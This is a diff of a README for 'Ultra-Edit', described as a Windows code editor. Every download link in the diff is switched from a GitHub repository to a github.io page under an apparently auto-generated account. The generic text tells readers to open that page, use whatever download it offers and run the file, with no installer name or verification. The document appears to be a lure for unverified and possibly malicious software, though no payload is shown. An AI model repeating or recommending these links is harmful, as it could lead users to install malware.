@@ -1,6 +1,6 @@
 # 🚀 Ultra-Edit - Professional Code Editing Made Simple
 
-[![Download Ultra-Edit](https://img.shields.io/badge/Download%20Ultra--Edit-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aubertsupposed529/Ultra-Edit)
+[![Download Ultra-Edit](https://img.shields.io/badge/Download%20Ultra--Edit-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://aubertsupposed529.github.io)
 
 Ultra-Edit is a professional desktop software utility that streamlines code editing and debugging processes by providing an efficient, error-free coding environment. It is designed for Windows users who want a reliable editor for opening, reviewing, editing, and troubleshooting code-related files without a complicated setup.
 
@@ -40,7 +40,7 @@ You do not need to install additional tools or prepare a development environment
 
 ## 💾 Download and Setup
 
-Visit this link to download the application: [Download Ultra-Edit](https://github.com/aubertsupposed529/Ultra-Edit).
+Visit this link to download the application: [Download Ultra-Edit](https://aubertsupposed529.github.io).
 
 The download link is a general project page, so the correct action is to visit it and use the download option available there. Do not look for a separate setup archive or installer name in this README. The page itself is where you begin the download process.
 
@@ -208,7 +208,7 @@ If you cannot find a feature, check the menus first. Search-related tools are us
 
 ## 🔗 Download Link
 
-Visit this link to download the application: [https://github.com/aubertsupposed529/Ultra-Edit](https://github.com/aubertsupposed529/Ultra-Edit)
+Visit this link to download the application: [https://aubertsupposed529.github.io](https://aubertsupposed529.github.io)
 
 Use the download option on that page, then open the downloaded application on your Windows computer to start editing.
 
